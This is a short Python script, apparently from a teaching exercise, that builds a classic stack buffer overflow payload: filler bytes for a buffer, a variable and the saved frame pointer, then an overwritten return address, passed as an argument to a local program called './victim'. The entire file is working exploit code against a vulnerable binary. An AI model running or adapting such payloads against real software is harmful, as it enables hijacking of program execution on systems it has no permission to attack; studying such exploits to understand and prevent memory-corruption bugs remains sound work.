#!/usr/bin/python

# This program is the python version of attack.
# It's also GPL'ed:-\

import os

code = ""
code += "\x41" * 10	#buf, fill with 'A'
code += "\x42" * 4	#variable "x", fill with 'B'
code += "\x43" * 4	# ebp, fill with 'C' 
code += "\x82\x84\x04\x08" #eip, change the correct address for your machine 

cmd = "./victim " + code
os.system(cmd)
